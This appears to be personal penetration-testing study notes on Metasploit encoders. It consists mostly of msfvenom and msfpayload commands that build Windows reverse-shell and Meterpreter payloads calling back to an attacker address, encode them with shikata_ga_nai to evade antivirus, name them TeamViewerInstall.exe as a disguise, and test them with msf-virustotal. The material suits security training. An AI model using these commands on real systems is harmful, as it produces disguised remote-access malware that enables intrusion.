- `Encoders` come into play with the role of changing the payload to run on different operating systems and architectures

|`x64`|`x86`|`sparc`|`ppc`|`mips`|
|---|---|---|---|---|
- They are also needed to remove hexadecimal opcodes known as `bad characters` from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above.
- [This article from FireEye](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) details the why and the how of Shikata Ga Nai's previous rule over the other encoders.


If we wanted to create our custom payload, we could do so through `msfpayload`, but we would have to encode it according to the target OS architecture using `msfencode` afterward.
```shell-session
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

know combined with msfvenom
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

#### Generating Payload - With Encoding
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

If we want to look at the functioning of the `shikata_ga_nai` encoder, we can look at an excellent post [here](https://hatching.io/blog/metasploit-payloads2/).

- if we have a exploit and we need to see what are the encoders that supports for this
  we can use `show encoders`

```shell-session
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
```

### detection of payloads

we are creating a payload that is making a .exe file 
```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```
![[metasploit/image 2.png]]

```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
we have done some changes hear so we can see the AV
![[metasploit/image 3.png]]

#### MSF - VirusTotal
Metasploit offers a tool called `msf-virustotal` that we can use with an API key to analyze our payloads
```shell-session
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```
still not enough

